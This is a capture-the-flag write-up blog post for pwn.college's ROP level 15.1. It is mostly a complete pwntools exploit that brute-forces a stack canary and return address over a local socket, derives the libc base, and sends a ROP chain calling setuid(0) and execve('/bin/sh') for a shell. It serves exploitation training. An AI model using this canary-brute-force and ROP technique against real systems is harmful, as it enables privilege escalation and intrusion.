+++
title = 'pwn.college - ROP 15.1'
date = 2023-09-22T15:29:34-04:00
tags = ["pwn", "rop", "asu"]
description = "In this section, I will be solving the last challenge of the Return Oriented Programming module on pwn.college, this challenge was straight up diabolical but really enjoyable."
draft = false
+++
This challenge, once again straight up Diabolical, but we solved it :)
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

If you want a more detailed writeup i would suggest looking at [[babyrop_level15.0]] instead.

The challenge had all protections enabled has we previously shown, and we had to bruteforce the canary, bruteforce the return address, once we have the return address we can subtract the offset to it resulting in the base address of libc. Once we got libc base it's jackpot and we win.
## Solution (remote)
I solved this challenge only remotely by slightly modifying the solution for [[babyrop_level15.0]], this is because the challenge is exactly the same only the buffer size changes, and also the process name (important when trying to kill the child process).
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyrop_level15.0
from pwn import *
import sys, os
import psutil

context.log_level = "error"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyrop_level15.1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def get_process():
    process_name = "babyrop_level15.1"

    for process in psutil.process_iter(['pid', 'name']):
        try:
            if process.info['name'] == process_name:
                return process.info['pid']
        except:
            return 0

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled


canary = b"\x00"
if len(sys.argv) >= 2:
    if sys.argv[1] == "-c":
        with open("canary.txt", "r") as file:
            canary = bytes.fromhex(file.readline())
            print(f"Using canary from file canary.txt")
            file.close()

if len(canary) == 1:
    while True:
        if len(canary) == 8:
            break
        for y in range(0, 256):
            print(f"Bruteforcing byte {len(canary) + 1} of canary with {p8(y)} :: {canary[::-1].hex()}")
            io = remote("127.0.0.1", 1337)
            p = [
                b"A" * 0x38, canary, p8(y)
            ]

            io.send(b"".join(p))
            output = io.recvall(timeout=4)
            if not b"stack smashing" in output:
                io.close()
                # start second check
                io = remote("127.0.0.1", 1337)
                io.send(b"".join(p))
                output = io.recvall(timeout=4)
                if not b"stack smashing" in output:
                    print(f"Found value {p8(y)} at offset {len(canary) + 1}")
                    io.close()
                    canary += p8(y)
                    break

            io.close()

        if len(canary) == 8:
            break

print(f"Using Canary: {canary[::-1].hex()}")
print(f"Using Canary: {canary.hex()}")
print(canary)

with open("canary.txt", "w+") as file:
    file.write(canary.hex())
    file.close()

ret_val = b"\x69"

print("STARTING RET BRUTE PRESS A KEY")
input()

if len(sys.argv) >= 3:
    if sys.argv[2] == "-r":
        with open("ret.txt", "r") as file:
            ret_val = bytes.fromhex(file.readline())

if len(ret_val) == 1:
    while True:
        if len(ret_val) == 7:
            break
        for y in range(0, 256):
            parent = psutil.Process(get_process())
            for child in parent.children(recursive=True):
                child.kill()
                if child.is_running():
                    print("CANT KILL PROCESS.... TERMINATING")

            print(f"Bruteforcing offset {len(ret_val)+1} of return value with {p8(y)} :: {ret_val[::-1].hex()}")
            io = remote("127.0.0.1", 1337)
            p = [
                b"A" * 0x38, canary, b"B" * 0x8,
                ret_val, p8(y)
            ]

            io.send(b"".join(p))
            t = io.recvuntil(b"Goodbye!\n")
            if b"stack smashing" in t:
                print("odd")
            output = io.recvall(timeout=4)
            print(output)
            if b"Welcome" in output:
                ret_val += p8(y)
                io.close()
                parent = psutil.Process(get_process())
                for child in parent.children(recursive=True):
                    child.kill()
                    if child.is_running():
                        print("CANT KILL PROCESS... TERMINATING")
                break

            io.close()
            parent = psutil.Process(get_process())
            for child in parent.children(recursive=True):
                child.kill()
                if child.is_running():
                    print("CANT KILL PROCESS... TERMINATING")

        if len(ret_val) == 7:
            break


ret_val = ret_val.ljust(8, b"\x00")
#print(ret_val)
#print(f"RETURN VALUE: {ret_val.hex()}")
print(f"RETURN VALUE: {ret_val[::-1].hex()}")
with open("ret.txt", "w+") as file:
    file.write(ret_val.hex())
    file.close()

print(ret_val)
print(ret_val.hex())
ret_val = int(ret_val[::-1].hex()[2:], 16) - 0x24069
#ret_val = ret_val - 0x24013
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print(f"libc base is at {hex(ret_val)}")
libc.address = ret_val
rop = ROP(libc)

parent = psutil.Process(get_process())
for child in parent.children(recursive=True):
    child.kill()

io = remote("127.0.0.1", 1337)
p = [
    b"A" * 0x38, canary, b"B"*0x8,
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]), p64(0),
    p64(libc.sym.setuid),
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]), p64(next(libc.search(b"/bin/sh"))),
    p64(rop.find_gadget(['pop rsi', 'ret'])[0]), p64(0),
    p64(libc.sym.execve)
    ]

io.send(b"".join(p))
io.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()
```

